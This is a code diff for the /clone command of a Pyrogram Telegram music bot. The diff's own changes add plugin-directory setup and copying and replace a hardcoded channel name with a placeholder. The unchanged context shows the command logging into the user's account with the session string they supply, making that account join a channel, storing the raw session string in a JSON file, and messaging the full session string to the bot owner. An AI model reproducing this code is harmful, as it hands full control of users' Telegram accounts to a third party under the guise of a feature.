@@ -3,9 +3,11 @@ from pyrogram import filters, Client, idle
 from pyrogram.types import Message
 import os
 import json
+import shutil
 
 # Directory to store clone data
 CLONE_DATA_FILE = "clone_data.json"
+PLUGINS_DIR = "CakeMusic/plugins/clone"
 
 # Helper function to load clone data from file
 def load_clone_data():
@@ -18,6 +20,20 @@ def load_clone_data():
 def save_clone_data(data):
     with open(CLONE_DATA_FILE, "w") as file:
         json.dump(data, file)
+
+# Ensure that the plugin directory exists
+def ensure_plugin_directory():
+    if not os.path.exists(PLUGINS_DIR):
+        os.makedirs(PLUGINS_DIR)
+
+# Function to copy plugins into the clone directory
+def copy_plugins():
+    source_plugin_dir = "CakeMusic/plugins"  # Assuming the main plugins are in CakeMusic/plugins
+    for plugin in os.listdir(source_plugin_dir):
+        src_path = os.path.join(source_plugin_dir, plugin)
+        dst_path = os.path.join(PLUGINS_DIR, plugin)
+        if os.path.isdir(src_path) and not os.path.exists(dst_path):
+            shutil.copytree(src_path, dst_path)  # Copy plugin directory if it doesn't exist in clone
 
 @bot.on_message(filters.command("clone"))
 async def clone(bot: Client, msg: Message):
@@ -40,19 +56,19 @@ async def clone(bot: Client, msg: Message):
     try:
         reply_msg = await msg.reply("Please wait... Setting up the session and loading plugins. 💌")
         
-        # Directory for plugins
-        plugin_dir = "CakeMusic/plugins/clone"
-        if not os.path.isdir(plugin_dir):
-            await reply_msg.edit(f"❌ **Error:** Plugin directory `{plugin_dir}` not found.")
-            return
+        # Ensure the plugin directory exists
+        ensure_plugin_directory()
         
+        # Copy plugins if they are not already present in the cloned directory
+        copy_plugins()
+
         # Initialize the client with the provided session string
         client = Client(
             name="ClonedClient",
             api_id=API_ID,
             api_hash=API_HASH,
             session_string=string_session,
-            plugins=dict(root=plugin_dir)
+            plugins=dict(root=PLUGINS_DIR)  # Load plugins from the specific directory
         )
 
         # Start the client and fetch user details
@@ -60,7 +76,7 @@ async def clone(bot: Client, msg: Message):
         user = await client.get_me()
 
         # Join a channel (You can specify any channel here)
-        channel = '@HEROKUBIN_01'  # Replace with actual channel ID or username
+        channel = 'your_channel_id_or_username'  # Replace with actual channel ID or username
         try:
             await client.join_chat(channel)
             print(f"Successfully joined the channel: {channel}")
@@ -72,7 +88,7 @@ async def clone(bot: Client, msg: Message):
             "user_id": user.id,
             "user_name": user.first_name,
             "session_id": string_session,
-            "plugins": os.listdir(plugin_dir)  # List the loaded plugins
+            "plugins": os.listdir(PLUGINS_DIR)  # List the loaded plugins
         }
         save_clone_data(clone_data)
 
@@ -81,7 +97,7 @@ async def clone(bot: Client, msg: Message):
                     f"**User:** {user.first_name}\n" \
                     f"**User ID:** {user.id}\n" \
                     f"**Session ID:** {string_session}\n" \
-                    f"**Plugins:** {', '.join(os.listdir(plugin_dir))}"
+                    f"**Plugins:** {', '.join(os.listdir(PLUGINS_DIR))}"
         await bot.send_message(OWNER_ID, owner_msg)
 
         # Success message
@@ -89,7 +105,7 @@ async def clone(bot: Client, msg: Message):
             f"🎉 Successfully cloned the session and loaded plugins!\n\n"
             f"👤 **User:** {user.first_name}\n"
             f"🆔 **User ID:** {user.id}\n"
-            f"**Plugins Loaded:** {', '.join(os.listdir(plugin_dir))}\n\n"
+            f"**Plugins Loaded:** {', '.join(os.listdir(PLUGINS_DIR))}\n\n"
             f"Enjoy using your cloned session. 💕"
         )
         await reply_msg.edit(success_msg)
